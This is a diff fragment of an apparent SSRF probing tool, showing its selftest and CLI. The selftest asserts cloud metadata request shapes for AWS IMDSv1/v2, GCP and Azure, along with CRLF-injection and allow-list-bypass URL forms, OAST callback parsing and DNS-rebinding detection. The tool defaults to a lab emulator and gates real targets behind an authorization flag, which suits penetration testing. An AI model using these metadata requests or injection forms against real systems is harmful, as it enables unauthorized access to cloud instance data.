+    eq(full["imdsv2"]["reachable"], True, "both controls together do reach IMDSv2")
+    eq(full["gcp_azure"]["reachable"], True, "header control reaches GCP and Azure")
+    half = classify({"hit": True, "method_controlled": True, "header_controlled": False,
+                     "scheme_http": True})
+    eq(half["imdsv2"]["reachable"], False, "method control alone is not enough")
+    unknown = classify({"hit": True, "method_controlled": None, "header_controlled": None})
+    eq(unknown["imdsv2"]["reachable"], False, "unknown is never reported as reachable")
+    ok("not determined" in unknown["imdsv2"]["why"], "and unknown says so, not 'no'")
+    nohit = classify({"hit": False})
+    ok("not a confirmed SSRF" in nohit["reach"][0], "no callback, no SSRF")
+    eq(nohit["imdsv1"]["reachable"], False, "no callback reaches nothing")
+
+    # --- metadata request shapes, per cloud
+    reqs = {r["name"]: r for r in metadata_requests()}
+    eq(reqs["aws-imdsv2-token"]["method"], "PUT", "IMDSv2's token step is a PUT")
+    eq(reqs["aws-imdsv2-token"]["url"], "http://169.254.169.254/latest/api/token",
+       "IMDSv2 token path")
+    ok("X-aws-ec2-metadata-token-ttl-seconds" in reqs["aws-imdsv2-token"]["headers"],
+       "the PUT carries the TTL header")
+    ok("X-aws-ec2-metadata-token" in reqs["aws-imdsv2-get"]["headers"],
+       "the GET carries the token header")
+    eq(reqs["gcp"]["headers"], {"Metadata-Flavor": "Google"}, "GCP's required header")
+    eq(reqs["azure"]["headers"], {"Metadata": "true"}, "Azure's required header")
+    ok(reqs["azure"]["url"].startswith("http://169.254.169.254/metadata/instance"),
+       "Azure IMDS path")
+    eq(reqs["aws-imdsv1"]["headers"], {}, "IMDSv1 needs no header")
+    eq(reqs["aws-imdsv1"]["method"], "GET", "IMDSv1 is a GET")
+    eq(reqs["gcp"]["url"],
+       "http://metadata.google.internal/computeMetadata/v1/instance/",
+       "GCP metadata host and path")
+    for name, r in reqs.items():
+        for bad in CREDENTIAL_PATHS:
+            ok(bad not in r["url"], f"{name} does not probe a credential path ({bad})")
+    lab = {r["name"]: r for r in metadata_requests("http://cloud-metadata",
+                                                   "http://cloud-metadata-v2")}
+    eq(lab["gcp"]["url"], "http://cloud-metadata/computeMetadata/v1/instance/",
+       "the lab base replaces the link-local host and keeps a path the emulator serves")
+    eq(lab["gcp"]["headers"], {"Metadata-Flavor": "Google"},
+       "the lab request keeps the real requirement, so the emulator can enforce it")
+    eq(lab["aws-imdsv2-token"]["url"], "http://cloud-metadata-v2/latest/api/token",
+       "the IMDSv2 shape goes to the emulator that requires a token")
+    eq(lab["aws-imdsv1"]["url"], "http://cloud-metadata/latest/meta-data/",
+       "IMDSv1 goes to the emulator that has it enabled")
+    ok("alibaba" not in lab,
+       "a cloud with no emulator is skipped in lab mode instead of probed at the "
+       "wrong host")
+    ok(len(metadata_requests(clouds=["gcp"])) == 1, "clouds can be selected")
+
+    # --- url forms
+    forms = dict(url_forms("abc123", "x.oast.test"))
+    ok(all("abc123" in v or v.startswith("file:") for v in forms.values()),
+       "every form carries the attempt token, except file:// which has no path to carry")
+    ok("crlf-header" in forms and "X-Mythos-Probe" in forms["crlf-header"],
+       "a header-injection form exists, since header control decides IMDSv2")
+    ok("%0d%0a" in forms["crlf-method"], "the method form smuggles a request line")
+    ok(forms["userinfo"].startswith("http://allowed.invalid@"),
+       "the userinfo form puts the allowed host before the @")
+    ok(forms["fragment"].endswith("@allowed.invalid/"),
+       "the fragment form puts it after a #")
+    ok(len(set(forms.values())) == len(forms), "no duplicate payloads")
+
+    # --- injection point rewriting
+    eq(inject("http://t.test/f?url=http://a&x=1", "url", "http://b"),
+       "http://t.test/f?url=http%3A%2F%2Fb&x=1", "only the named parameter changes")
+    ok("url=z" in urllib.parse.unquote(inject("http://t.test/f", "url", "z")),
+       "a missing parameter is added")
+
+    # --- OAST log parsing, both producers
+    lab_log = ('{"ts":"t1","proto":"http","src":"10.0.0.5","method":"GET",'
+               '"path":"/mabc-plain","host":"oast:8080","ua":"curl/8"}\n'
+               '{"ts":"t2","proto":"dns","src":"10.0.0.5","name":"mabc.oast"}\n'
+               'not json\n')
+    hits = parse_oast_log(lab_log)
+    eq(len(hits), 2, "both lab records parsed, the junk line dropped")
+    eq(hits[0]["raw_headers"], None, "the lab log carries no headers, and says so with None")
+    eq(len(hits_for(hits, "mabc")), 2, "the token matches in path and in a DNS name")
+    eq(len(hits_for(hits, "mzzz")), 0, "another token matches nothing")
+    ish = json.dumps({"protocol": "http", "unique-id": "mdef",
+                      "remote-address": "1.2.3.4",
+                      "raw-request": "PUT /mdef HTTP/1.1\r\nHost: x\r\n"
+                                     "X-Mythos-Probe: mdef\r\nUser-Agent: go\r\n\r\n"})
+    ih = parse_oast_log(ish)
+    eq(ih[0]["method"], "PUT", "the method comes out of the raw request line")
+    ok("x-mythos-probe" in ih[0]["raw_headers"],
+       "interactsh's raw request is what proves header control")
+    eq(ih[0]["ua"], "go", "the UA is lifted from the raw headers")
+
+    # --- blind verdict
+    v = blind_verdict([{"parameter": "u", "arm": "attack", "hits": [1]},
+                       {"parameter": "u", "arm": "control", "hits": []}])
+    ok("confirmed SSRF" in v[0], "a hit with a clean control is the confirmation")
+    v2 = blind_verdict([{"parameter": "u", "arm": "attack", "hits": [1]},
+                        {"parameter": "u", "arm": "control", "hits": [1]}])
+    ok("something other than the target" in v2[0],
+       "both arms hit means the control caught the real fetcher")
+    v3 = blind_verdict([{"parameter": "u", "arm": "attack", "hits": []},
+                        {"parameter": "u", "arm": "control", "hits": []}])
+    ok("no hit" in v3[0], "no hits is not a finding")
+
+    # --- rebinding judgement
+    r = rebind_verdict([["1.1.1.1"], ["2.2.2.2"]], 1)
+    eq(r["rebinding_preconditions"], True, "a 1s TTL and two answers is the precondition")
+    ok(any("different answer sets" in n for n in r["reasons"]), "the flip is reported")
+    r2 = rebind_verdict([["1.1.1.1"], ["1.1.1.1"]], 3600)
+    eq(r2["rebinding_preconditions"], False, "a one-hour TTL closes the window")
+    r3 = rebind_verdict([["1.1.1.1"]], None)
+    ok(any("no TTL" in n for n in r3["reasons"]),
+       "a missing TTL is not read as a short one")
+    ok("Detection stops here" in r3["next"], "the subcommand says it is detection only")
+
+    # --- the metadata default really is the lab
+    ok(LAB_METADATA.startswith("http://"),
+       "the default metadata target is a lab URL, not a link-local address")
+    ok("169.254" not in LAB_METADATA, "and it is not the real metadata address")
+
+    for f in fails:
+        print(f"FAIL {f}")
+    print(f"ssrfprobe selftest: {len(fails)} failure(s)")
+    return 1 if fails else 0
+
+# ------------------------------------------------------------------ cli
+
+
+def build_parser():
+    ap = argparse.ArgumentParser(
+        prog="ssrfprobe", description=__doc__,
+        formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("--selftest", action="store_true", help="offline asserts, no network")
+    ap.add_argument("--json", action="store_true")
+    ap.add_argument("--timeout", type=float, default=10)
+    ap.add_argument("--insecure", action="store_true")
+    ap.add_argument("--rate", type=float, default=None,
+                    help="requests per second; default rules.rate_limit_rps from "
+                         "$MYTHOS_SCOPE, else 5")
+    sub = ap.add_subparsers(dest="cmd")
+
+    def oastargs(p):
+        p.add_argument("--oast-log", help="URL that dumps the catcher's log "
+                                          "(lab: http://oast:8080/__log)")
+        p.add_argument("--oast-log-file", help="a saved log file instead "
+                                               "(interactsh -json works)")
+
+    p = sub.add_parser("probe", help="classify what the SSRF controls: scheme, method, "
+                                     "headers, redirects, response visible or blind",
+                       description="Send one request per URL form, then read the OAST "
+                                   "log and state method control and header control "
+                                   "explicitly, because those two decide whether any "
+                                   "cloud metadata is in reach at all.")
+    p.add_argument("url")
+    p.add_argument("parameter")
+    p.add_argument("--oast", required=True, help="host (or http://host:port) you control "
+                                                 "and that scope.yaml authorizes")
+    p.add_argument("--control", help="a destination the application is supposed to allow, "
+                                     "for the negative control")
+    p.add_argument("--method", default="GET", help="method for the request to the TARGET")
+    p.add_argument("--token", help="reuse a token instead of minting one")
+    p.add_argument("--marker", help="a string your OAST host serves in its body; "
+                                    "without it, 'response visible' stays unknown "
+                                    "rather than being reported as no")
+    oastargs(p)
+    p.set_defaults(fn=cmd_probe)
+
+    m = sub.add_parser("metadata", help="the cloud metadata surfaces with their real "
+                                        "requirements (IMDSv1/v2, GCP, Azure)",
+                       description="Defaults to the lab emulator. The real link-local "
+                                   "addresses need --real and --i-have-authorization.")
+    m.add_argument("url")
+    m.add_argument("parameter")
+    m.add_argument("--lab", help=f"lab emulator base URL (default {LAB_METADATA}, "
+                                 "$MYTHOS_METADATA_LAB)")
+    m.add_argument("--lab-v2", help=f"lab emulator that requires IMDSv2 (default "
+                                    f"{LAB_METADATA_V2}, $MYTHOS_METADATA_LAB_V2)")
+    m.add_argument("--real", action="store_true",
+                   help="aim at 169.254.169.254 and metadata.google.internal instead")
+    m.add_argument("--i-have-authorization", action="store_true",
+                   help="required with --real: the programme allows metadata probing")
+    m.add_argument("--method", default="GET")
+    m.set_defaults(fn=cmd_metadata)
+
+    b = sub.add_parser("blind", help="blind SSRF through OAST, one token per injection "
+                                     "point plus a negative control")
+    b.add_argument("url")
+    b.add_argument("parameter", nargs="+", help="one or more parameters to test")
+    b.add_argument("--oast", required=True)
+    b.add_argument("--control", help="an allowed destination for the control arm; "
+                                     "default is a second OAST token")
+    b.add_argument("--method", default="GET")
+    b.add_argument("--wait", type=float, default=0,
+                   help="seconds to wait before reading the log (capped at 120)")
+    oastargs(b)
+    b.set_defaults(fn=cmd_blind)
+
+    d = sub.add_parser("rebind", help="DNS rebinding preconditions: more than one answer, "
+                                      "and a short TTL. Detection only.")
+    d.add_argument("host")
+    d.add_argument("--samples", type=int, default=3, help="lookups, 2 to 6")
+    d.add_argument("--gap", type=float, default=0, help="seconds between lookups")
+    d.add_argument("--resolver", help="nameserver to ask; default is the first in "
+                                      "/etc/resolv.conf")
+    d.set_defaults(fn=cmd_rebind)
+    return ap
+
+
+def main():
+    ap = build_parser()
+    a = ap.parse_args()
+    if a.selftest:
+        return _selftest()
+    if not getattr(a, "cmd", None):
+        ap.print_help()
+        return 2
+    rate = scope_rate() if a.rate is None else a.rate
+    _GAP[0] = 1.0 / rate if rate and rate > 0 else 0.0
+    res = a.fn(a)
+    print(json.dumps(res, indent=1) if a.json else render(res))
+    if _SENT[0]:
+        print(f"\n({_SENT[0]} request(s) sent at <= {rate}/s)", file=sys.stderr)
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
